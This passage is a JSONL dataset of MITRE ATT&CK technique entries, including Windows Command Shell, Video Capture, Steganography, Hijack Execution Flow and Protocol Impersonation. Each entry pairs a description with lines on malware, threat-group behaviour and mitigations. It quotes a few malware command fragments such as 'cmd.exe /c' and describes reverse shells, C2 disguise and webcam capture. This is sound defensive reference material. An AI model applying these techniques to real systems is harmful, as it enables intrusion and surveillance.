VBScript in an XSL stylesheet located on a remote domain. "], "is_subtechnique": false}
{"text": " Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows) Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.", "idx": "https://attack.mitre.org/techniques/T1059/003", "title": "Windows Command Shell", "entity": "Windows Command Shell", "entity_type": "techniques", "entity_context": ["KGH_SPY has the ability to set a Registry key to run a cmd.exe command.", "Pteranodon can execute commands on the victim.", "APT18 uses cmd.exe to execute commands on the victim’s machine.", "Proxysvc executes a binary on the system and logs the results into a temp file by using: <code>cmd.exe /c \"<file_path> > %temp%\\PM* .tmp 2>&1\"</code>.", "An APT28 loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.", "Egregor has used batch files for execution and can launch Internet Explorer from cmd.exe. ", "ZxShell can launch a reverse command shell.", "adbupd can run a copy of cmd.exe.", "InnaputRAT launches a shell to execute commands on the victim’s machine.", "Comnie executes BAT scripts.", "PLEAD has the ability to execute shell commands on the compromised host.", "Ryuk has used <code>cmd.exe</code> to create a Registry entry to establish persistence.", "Denis can launch a remote shell to execute arbitrary commands on the victim’s machine.", "MirageFox has the capability to execute commands using cmd.exe.", "Lucifer can issue shell commands to download and execute additional payloads.", "EvilBunny has an integrated scripting engine to download and execute Lua scripts.", "SeaDuke is capable of executing commands.", "InvisiMole can launch a remote shell to execute commands.", "Anchor has used cmd.exe to run its self deletion routine.", "ServHelper can execute shell commands against cmd.", "DealersChoice makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.", "GreyEnergy uses cmd.exe to execute itself in-memory.", "Dark Caracal has used macros in Word documents that would download a second stage if executed.", "APT29 used <code>cmd.exe</code> to execute commands on remote machines.", "CALENDAR has a command to run cmd.exe to execute commands.", "4H RAT has the capability to create a remote shell.", "Turla RPC backdoors have used cmd.exe to execute commands.", "TA551 has used <code>cmd.exe</code> to execute commands.", "Remcos can launch a remote command line to execute commands on the victim’s machine.", "Nomadic Octopus used <code>cmd.exe /c</code> within a malicious macro.", "Dtrack has used <code>cmd.exe</code> to add a persistent service.", "Seth-Locker can execute commands via the command line shell.", "HiddenWasp uses a script to automate tasks on the victim's machine and to assist in execution.", "Helminth can provide a remote shell. One version of Helminth uses batch scripting.", "Zeus Panda can launch an interface where it can execute several commands on the victim’s PC.", "GALLIUM used the Windows command shell to execute commands.", "OopsIE uses the command prompt to execute commands on the victim's machine.", "GoldMax can spawn a command shell, and execute native commands.", "RogueRobin uses Windows Script Components.", "MoonWind can execute commands via an interactive command shell. MoonWind uses batch scripts for various purposes, including to restart and uninstall itself.", "MechaFlounder has the ability to run commands on a compromised host.", "QUADAGENT uses cmd.exe to execute scripts and commands on the victim’s machine.", "EnvyScout can use cmd.exe to execute malicious files on compromised hosts.", "Sandworm Team has run the  <code>xp_cmdshell</code> command in MS-SQL. ", "Linfo creates a backdoor through which remote attackers can start a remote shell.", "HotCroissant can remotely open applications on the infected host with the <code>ShellExecuteA</code> command.", "QuasarRAT can launch a remote shell to execute commands on the victim’s machine.", "FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via cmd.", "HOPLIGHT can launch cmd.exe to execute commands on the system.\t", "Several tools used by Suckfly have been command-line driven.", "Pisloader uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.", "ComRAT has used <code>cmd.exe</code> to execute commands.", "Seasalt uses cmd.exe to create a reverse shell on the infected endpoint.", "Misdat is capable of providing shell functionality to the attacker to execute commands.", "Machete has used batch files to initiate additional downloads of malicious files.", "APT32 has used cmd.exe for execution. ", "Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file.", "SideTwist can execute shell commands on a compromised host.", "BONDUPDATER can read batch commands in a file sent from its C2 server and execute them with cmd.exe.", "TSCookie has the ability to execute shell commands on the infected host.", "BADNEWS is capable of executing commands via cmd.exe.", "BBK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.", "BLINDINGCAN has executed commands via cmd.exe.", "LoudMiner used a batch script to run the Linux virtual machine as a service.", "Crimson has the ability to execute commands with the COMSPEC environment variable.", "Ke3chang has used batch scripts in its malware to install persistence mechanisms.", "DropBook can execute arbitrary shell commands on the victims' machines. ", "KeyBoy can launch interactive shells for communicating with the victim machine.", "Cuba has used <code>cmd.exe /c</code> and batch files for execution. ", "njRAT can launch a command shell interface for executing commands.", "AuditCred can open a reverse shell on the system to execute commands.", "APT37 has used the command-line interface.", "Gold Dragon uses cmd.exe to execute commands for discovery.", "Hikit has the ability to create a remote shell and run given commands.", "RGDoor uses cmd.exe to execute commands on the victim’s machine.", "Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection.", "Patchwork ran a reverse shell with Meterpreter. Patchwork used JavaScript code and .SCT files on victim machines.", "Emotet has used cmd.exe to run a PowerShell script. ", "Bankshot uses the command-line interface to execute arbitrary commands.", "NETEAGLE allows adversaries to execute shell commands on the infected host.", "DarkComet can launch a remote shell to execute commands on the victim’s machine.", "Daserf can execute shell commands.", "NETWIRE can issue commands using cmd.exe.", "Dragonfly 2.0 used various types of scripting to perform operations, including batch scripts.", "Bandook is capable of spawning a Windows command shell.", "Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.", "zwShell can launch command-line shells.", "PLAINTEE uses cmd.exe to execute commands on the victim’s machine.", "PoisonIvy creates a backdoor through which remote attackers can open a command-line interface.", "FIN10 has executed malicious .bat files containing PowerShell commands.", "Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands.", "JCry has used <code>cmd.exe</code> to launch PowerShell.\t", "MCMD can launch a console process (cmd.exe) with redirected standard input and output.", "ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host.", "Wizard Spider has used cmd.exe to execute commands on a victim's machine.", "USBferry can execute various Windows commands.\t", "Caterpillar WebShell can run commands on the compromised asset with CMD functions.", "Out1 can use native command line for execution.", "Lazarus Group malware uses cmd.exe to execute commands on victims. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.", "ABK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.", "LookBack executes the <code>cmd.exe</code> command.", "MegaCortex has used <code>.cmd</code> scripts on the victim's system. ", "APT41 used <code>cmd.exe /c</code> to execute commands on remote machines.\nAPT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.", "Bazar can launch cmd.exe to perform reconnaissance commands.", "Koadic can open an interactive command-shell to perform command line functions on victim machines. Koadic performs most of its operations using Windows Script Host (Jscript) and runs arbitrary shellcode .", "GrimAgent can use the Windows Command Shell to execute commands, including its own removal.", "Orz can execute shell commands. Orz can execute commands with JavaScript.", "BRONZE BUTLER has used batch scripts and the command-line interface for execution.", "TinyZBot supports execution from the command-line.", "Empire has modules for executing scripts.", "XTunnel has been used to execute remote commands.", "Ragnar Locker has used cmd.exe and batch scripts to execute commands.", "TAINTEDSCRIBE can enable Windows CLI access and execute files.", "Chaes has used cmd to execute tasks on the system. ", "Metamorfo has used <code>cmd.exe /c</code> to execute files. ", "Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system.", "Carbanak has a command to create a reverse shell.", "Ixeshe is capable of executing commands via cmd.", "RDAT has executed commands using <code>cmd.exe /c</code>.\t", "Tropic Trooper has used Windows command scripts.\t", "Lokibot has used <code>cmd /c</code> commands embedded within batch scripts. ", "Magic Hound has used the command-line interface.", "Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.", "Threat Group-3390 has used command-line interfaces for execution.", "Nebulae can use CMD to execute a process.", "CARROTBAT has the ability to execute command line arguments on a compromised host.", "Rancor has used cmd.exe to execute commmands.", "APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution.", "HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.", "SamSam uses custom batch scripts to execute some of its components.", "OilRig has used macros to deliver malware such as QUADAGENT and OopsIE. OilRig has used batch scripts.", "Peppy has the ability to execute shell commands.", "Cobalt Strike uses a command-line interface to interact with systems.", "BabyShark has used cmd.exe to execute commands.\t", "CoinTicker executes a bash script to establish a reverse shell.", "LightNeuron is capable of executing commands via cmd.exe.", "Siloscape can run cmd through an IRC channel.", "Dipsind can spawn remote shells.", "PlugX allows actors to spawn a reverse shell on a victim.", "BISCUIT has a command to launch a command shell on the system.", "Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell.", "APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine.", "H1N1 kills and disables services by using cmd.exe.", "JPIN can use the command-line utility cacls.exe to change file permissions.", "OceanSalt can create a reverse shell on the infected endpoint using cmd.exe. OceanSalt has been executed via malicious macros.", "Clop can use cmd.exe to help execute commands on the system. ", "Turian can create a remote shell and execute commands using cmd.", "RTM uses the command line and rundll32.exe to execute.", "China Chopper's server component is capable of opening a command terminal.", "Micropsia creates a command-line shell using cmd.exe.", "Exaramel for Windows has a command to launch a remote shell and executes commands on the victim’s machine.", "RainyDay can use the Windows Command Shell for execution.", "WellMess can execute command line scripts received from C2.", "Felismus uses command line for execution.", "Conti can utilize command line options to allow an attacker control over how it scans and encrypts files.", "RobbinHood uses cmd.exe on the victim's computer.", "WastedLocker has used cmd to execute commands on the system.", "Volgmer can execute commands on the victim's machine.", "FELIXROOT executes batch scripts on the victim’s machine, and can launch a reverse shell for command execution.", "Emissary has the capability to create a remote shell and execute specified commands.", "NanoCore can open a remote command-line interface and execute commands. NanoCore uses JavaScript files.", "Blue Mockingbird has used batch script files to automate execution and deployment of payloads.", "An APT3 downloader uses the Windows command <code>\"cmd.exe\" /C whoami</code>. The group also uses a tool to execute commands on remote computers.", "TURNEDUP is capable of creating a reverse shell.", "More_eggs has used cmd.exe for execution.", "ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.", "PHOREAL is capable of creating reverse shell.", "Higaisa used <code>cmd.exe</code> for execution.", "BlackMould can run cmd.exe with parameters.", "Kasidet can execute commands using cmd.exe.", "Fox Kitten has used cmd.exe likely as a password changing mechanism.", "REvil can use the Windows command line to delete volume shadow copies and disable recovery.", "MarkiRAT can utilize cmd.exe to execute commands in a victim's environment.", "Sowbug has used command line during its intrusions.", "GravityRAT executes commands remotely on the infected host.", "xCaon has a command to start an interactive shell.", "JHUHUGIT uses a .bat file to execute a .dll.", "Operation Wocao has spawned a new <code>cmd.exe</code> process to execute commands.\t ", "MURKYTOP uses the command-line interface.", "SDBbot has the ability to use the command shell to execute commands on a compromised host.", "Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.", "UBoatRAT can start a command shell.", "Taidoor can copy cmd.exe into the system temp folder.", "Cardinal RAT can execute commands.", "httpclient opens cmd.exe on the victim.", "MoleNet can execute commands via the command line utility.", "TEXTMATE executes cmd.exe to provide a reverse shell to adversaries.", "HTTPBrowser is capable of spawning a reverse shell on a victim.", "BackConfig can download and run batch files to execute commands on a compromised host.", "TDTESS provides a reverse shell on the victim.", "Chimera has used the Windows Command Shell and batch scripts for execution on compromised hosts.", "Several commands are supported by the Honeybee's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint. Honeybee used batch scripting.", "MuddyWater has used a custom tool for creating reverse shells.", "Revenge RAT uses cmd.exe to execute commands and run scripts on the victim's machine.", "Operators deploying Netwalker have used batch scripts to retrieve the Netwalker payload.", "RATANKBA uses cmd.exe to execute commands.", "SQLRat has used SQL to execute JavaScript and VB scripts on the host system.", "GoldenSpy can execute remote commands via the command-line interface.\t", "RunningRAT uses a batch file to kill a security program task and then attempts to remove itself.", "Wiarp creates a backdoor through which remote attackers can open a command line interface.", "ADVSTORESHELL can create a remote shell and run a given command.", "Umbreon provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet", "Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files.", "FIN7 used the command prompt to launch commands on the victim’s machine. ", "Indrik Spider has used batch scripts on victim's machines. ", "Adversaries can direct BACKSPACE to execute from the command line on infected hosts, or have BACKSPACE create a reverse shell.", "Mis-Type uses cmd.exe to run commands for enumerating the host.", "Remexi silently executes received commands with cmd.exe.", "BLACKCOFFEE has the capability to create a reverse shell.", "SYSCON has the ability to execute commands through cmd on a compromised host.", "HARDRAIN uses cmd.exe to execute <code>netsh</code>commands.", "Okrum's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.", "Use application control where appropriate.", "Pony has used batch scripts to delete itself after execution.\t", "Goopy has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.\t", "POWRUNER can execute commands from its C2 server.", "WEBC2 can open an interactive command shell.", "HOMEFRY uses a command-line interface.", "TA505 has executed commands using <code>cmd.exe</code>.", "ZLib has the ability to execute shell commands.", "RedLeaves can receive and execute commands with cmd.exe. It can also provide a reverse shell.", "Hi-Zor has the ability to create a reverse shell.", "PoetRAT has called cmd through a Word document macro.", "TeamTNT has used batch scripts to download tools and executing cryptocurrency miners.", "Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer.", "SLOTHFULMEDIA can open a command line to execute commands.", "jRAT has command line access.", "UPPERCUT uses cmd.exe to execute commands on the victim’s machine.", "StreamEx has the ability to remotely execute commands.", "A module in CozyCar allows arbitrary commands to be executed by invoking <code>C:\\Windows\\System32\\cmd.exe</code>.", "Rising Sun executed commands using cmd.exe. ", "Bisonal can launch cmd.exe to execute commands on the system.", "Babuk has the ability to use the command line to control execution on compromised hosts.", "DownPaper uses the command line.", "The Maze encryption process has used batch scripts with various commands.", "Cobian RAT can launch a remote command shell interface for executing commands.", "Silence has used Windows command-line to run commands.", "ShimRat can be issued a command shell function from the C2.", "hcdLoader provides command-line access to the compromised system.", "Frankenstein has run a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line.", "TYPEFRAME can uninstall malware components using a batch script. TYPEFRAME can execute commands using a shell.", "Spark can use cmd.exe to run commands. ", "Kazuar uses cmd.exe to execute commands on the victim’s machine.", "PowerDuke runs <code>cmd.exe /c</code> and sends the output to its C2.", "KEYMARBLE can execute shell commands using cmd.exe.", "Mivast has the capability to open a remote shell and run basic commands.", "FIN6 has used <code>kill.bat</code> script to disable security tools.", "Zebrocy uses cmd.exe to execute commands on the system. ", "Astaroth spawns a CMD process to execute commands. ", "TrickBot has used macros in Excel documents to download and deploy the malware on the user’s machine.", "menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files.", "SEASHARPEE can execute commands on victims.", "SNUGRIDE is capable of executing commands and spawning a reverse shell.", "SharpStage can execute arbitrary commands with the command line.", "QakBot can use cmd.exe to launch itself and to execute multiple C2 commands.", "BoxCaon can execute arbitrary commands and utilize the \"ComSpec\" environment variable.", "KONNI has used cmd.exe execute arbitrary commands on the infected host across different stages of the infection change.", "cmd is used to execute programs and other actions at the command-line interface.", "NavRAT leverages cmd.exe to perform discovery techniques. NavRAT loads malicious shellcode and executes it in memory.", "KOMPROGO is capable of creating a reverse shell."], "is_subtechnique": true}
{"text": " Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021) Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)", "idx": "https://attack.mitre.org/techniques/T1614", "title": "System Location Discovery", "entity": "System Location Discovery", "entity_type": "techniques", "entity_context": ["Crimson can identify the geographical location of a victim host.\t ", "GrimAgent can identify the country code on a compromised host.", "Before executing malicious code, Ragnar Locker checks the Windows API <code>GetLocaleInfoW</code> and doesn't encrypt files if it finds a former Soviet country."], "is_subtechnique": false}
{"text": " Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)", "idx": "https://attack.mitre.org/techniques/T1583/005", "title": "Botnet", "entity": "Botnet", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files. Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen. In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)", "idx": "https://attack.mitre.org/techniques/T1125", "title": "Video Capture", "entity": "Video Capture", "entity_type": "techniques", "entity_context": ["TajMahal has the ability to capture webcam video.", "SDBbot has the ability to record video on a compromised host.", "Cobian RAT has a feature to access the webcam on the victim’s machine.", "ConnectWise can record video on remote hosts.", "Bandook has modules that are capable of capturing video from a victim's webcam.", "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to <code>%APPDATA%\\Intel\\Skype</code>.", "Kazuar captures images from the webcam.", "QuasarRAT can perform webcam viewing.", "Machete takes photos from the computer’s web camera.", "Derusbi is capable of capturing video.", "Remcos can access a system’s webcam and take pictures.", "Crimson can capture webcam video on targeted systems.", "ZxShell has a command to perform video device spying. ", "Empire can capture webcam data on Windows and macOS systems.", "Agent Tesla can access the victim’s webcam and record video.", "InvisiMole can remotely activate the victim’s webcam to capture content.", "Silence has been observed making videos of victims to observe bank employees day to day activities.", "Revenge RAT has the ability to access the webcam.", "EvilGrab has the capability to capture video from a victim machine.", "PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts.", "DarkComet can access the victim’s webcam to take pictures.", "njRAT can access the victim's webcam.", "NanoCore can access the victim's webcam and capture data.", "Imminent Monitor has a remote webcam monitoring capability.", "Pupy can access a connected webcam and capture pictures.", "FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment.", "jRAT has the capability to capture video from a webcam.", "ObliqueRAT can capture images from webcams on compromised hosts."], "is_subtechnique": false}
{"text": " Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.", "idx": "https://attack.mitre.org/techniques/T1584/006", "title": "Web Services", "entity": "Web Services", "entity_type": "techniques", "entity_context": ["Turla has frequently used compromised WordPress sites for C2 infrastructure.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.", "idx": "https://attack.mitre.org/techniques/T1001/002", "title": "Steganography", "entity": "Steganography", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level. ", "Some malware that has been used by Axiom also uses steganography to hide communication in PNG image files.", "Daserf can use steganography to hide malicious code downloaded to the victim.", "HAMMERTOSS is controlled via commands that are appended to image files.", "RDAT can process steganographic images attached to email messages to send and receive C2 commands. RDAT can also embed additional messages within BMP images to communicate with the RDAT operator.\t", "ZeroT has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.", "LightNeuron is controlled via commands that are embedded into PDFs and JPGs using steganographic methods.", "When the Duqu command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.", "APT29 has used steganography to hide C2 communications in images.", "SUNBURST C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.", "Sliver can encode binary data into a .PNG file for C2 communication."], "is_subtechnique": true}
{"text": " Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)", "idx": "https://attack.mitre.org/techniques/T1531", "title": "Account Access Removal", "entity": "Account Access Removal", "entity_type": "techniques", "entity_context": ["MegaCortex has changed user account passwords and logged users off the system.", "LockerGoga has been observed changing account passwords and logging off current users."], "is_subtechnique": false}
{"text": " Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution. There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.", "idx": "https://attack.mitre.org/techniques/T1574", "title": "Hijack Execution Flow", "entity": "Hijack Execution Flow", "entity_type": "techniques", "entity_context": ["Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.", "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.", "When possible, include hash values in manifest files to help prevent side-loading of malicious libraries.", "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.", "Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory)\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > Policies > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code>", "Install software in write-protected locations. Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard library folders.", "Turn off UAC's privilege elevation for standard users <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System</code> to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.  ", "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able.\n\nEnsure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution.", "Use auditing tools capable of detecting hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for hijacking weaknesses.\n\nUse the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.\n\nFind and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations.", "Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software.", "Update software regularly to include patches that fix DLL side-loading vulnerabilities.", "One of Dtrack can replace the normal flow of a program execution with malicious code."], "is_subtechnique": false}
{"text": " Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial, recurring, or future execution of malicious code. The [at](https://attack.mitre.org/software/S0110) command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux) An adversary may use [at](https://attack.mitre.org/software/S0110) in Linux environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account. Adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)", "idx": "https://attack.mitre.org/techniques/T1053/001", "title": "At (Linux)", "entity": "At (Linux)", "entity_type": "techniques", "entity_context": ["Users account-level access to <code>at</code> can be managed using <code>/etc/at.allow</code> and <code>/etc/at.deny</code> files. Users listed in the at.allow are enabled to schedule actions using at, whereas users listed in at.deny file disabled from the utility.", "Scheduled tasks using <code>at</code> can be audited locally, or through centrally collected logging, using syslog, or auditd events from the host. "], "is_subtechnique": true}
{"text": " Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic. Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.", "idx": "https://attack.mitre.org/techniques/T1001/003", "title": "Protocol Impersonation", "entity": "Protocol Impersonation", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level.", "FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants of FakeM use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.", "TAINTEDSCRIBE has used FakeTLS for session authentication.", "Bankshot generates a false TLS handshake using a public certificate to disguise C2 network communications.", "HARDRAIN uses FakeTLS to communicate with its C2 server.", "Higaisa used a FakeTLS session for C2 communications.", "InvisiMole can mimic HTTP protocol with custom HTTP “verbs” HIDE, ZVVP, and NOP.", "Okrum mimics HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.", "KeyBoy uses custom SSL libraries to impersonate SSL in C2 traffic.", "Cobalt Strike can mimic the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI.", "Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.", "FALLCHILL uses fake Transport Layer Security (TLS) to communicate with its C2 server.", "BADCALL uses a FakeTLS method during C2.", "SUNBURST masqueraded its network traffic as the Orion Improvement Program (OIP) protocol."], "is_subtechnique": true}
